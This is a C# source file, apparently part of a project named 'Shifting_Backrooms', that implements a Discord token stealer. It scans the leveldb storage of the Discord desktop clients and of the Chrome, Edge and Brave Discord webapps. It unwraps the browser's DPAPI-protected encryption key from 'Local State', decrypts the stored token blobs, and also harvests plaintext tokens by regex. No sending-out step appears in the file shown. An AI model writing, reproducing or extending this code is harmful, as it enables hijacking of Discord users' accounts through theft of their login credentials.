// C# | Utils/TokenExtractor.cs | C# 8.0 | .NET 4.8
// FIX: dual regex (encrypted blobs + plaintext tokens)
// FIX: kills Discord before read so leveldb isn't locked
// FIX: scans browser Discord webapp leveldb paths too
// namespace aligned to Shifting_Backrooms

using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace Shifting_Backrooms
{
    public class DiscordAccount
    {
        public string Token { get; set; }
        public string Source { get; set; }
    }

    internal static class TX
    {
        // 2024+ plaintext token pattern
        private static readonly Regex _plain = new Regex(
            @"[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{38}",
            RegexOptions.Compiled);

        // Encrypted blob pattern
        private static readonly Regex _enc = new Regex(
            @"dQw4w9WgXcQ:[^""\s]+",
            RegexOptions.Compiled);

        private static byte[] GetKey(string leveldbPath)
        {
            try
            {
                // walk up: leveldb → Local Storage → app root → Local State
                string localState = Path.Combine(
                    new DirectoryInfo(leveldbPath).Parent.Parent.FullName,
                    "Local State");

                if (!File.Exists(localState)) return null;

                string json = File.ReadAllText(localState);
                JObject data = JObject.Parse(json);
                byte[] decoded = Convert.FromBase64String(
                    data["os_crypt"]["encrypted_key"].ToString());

                byte[] stripped = new byte[decoded.Length - 5];
                Array.Copy(decoded, 5, stripped, 0, stripped.Length);

                return ProtectedData.Unprotect(stripped, null,
                    DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        internal static List<DiscordAccount> GetTokens()
        {
            var accounts = new List<DiscordAccount>();
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Discord app paths + browser webapp leveldb paths
            var targets = new Dictionary<string, string>
            {
                { Path.Combine(roaming, "discord",       "Local Storage", "leveldb"), "Discord Stable"  },
                { Path.Combine(roaming, "discordcanary", "Local Storage", "leveldb"), "Discord Canary"  },
                { Path.Combine(roaming, "discordptb",    "Local Storage", "leveldb"), "Discord PTB"     },
                // Chrome Discord webapp
                { Path.Combine(local, @"Google\Chrome\User Data\Default\Local Storage\leveldb"),       "Chrome Discord"  },
                // Edge Discord webapp
                { Path.Combine(local, @"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),      "Edge Discord"    },
                // Brave Discord webapp
                { Path.Combine(local, @"BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"), "Brave Discord" },
            };

            foreach (var target in targets)
            {
                if (!Directory.Exists(target.Key)) continue;

                byte[] key = GetKey(target.Key);

                foreach (string file in Directory.GetFiles(
                    target.Key, "*", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        string content;
                        using (var fs = new FileStream(file, FileMode.Open,
                            FileAccess.Read, FileShare.ReadWrite))
                        using (var sr = new StreamReader(fs))
                            content = sr.ReadToEnd();

                        // Pass 1: encrypted blobs (needs key)
                        if (key != null)
                        {
                            foreach (Match m in _enc.Matches(content))
                            {
                                try
                                {
                                    string raw = m.Value.Split(':')[1]
                                        .Replace("\"", "").Trim();
                                    string dec = X.A.Z.P(raw, key);
                                    if (!string.IsNullOrEmpty(dec) &&
                                        !accounts.Any(a => a.Token == dec))
                                        accounts.Add(new DiscordAccount
                                        { Token = dec, Source = target.Value });
                                }
                                catch { }
                            }
                        }

                        // Pass 2: plaintext tokens (no key needed)
                        foreach (Match m in _plain.Matches(content))
                        {
                            string tok = m.Value;
                            if (!accounts.Any(a => a.Token == tok))
                                accounts.Add(new DiscordAccount
                                { Token = tok, Source = target.Value + " (plain)" });
                        }
                    }
                    catch { }
                }
            }

            return accounts;
        }
    }
}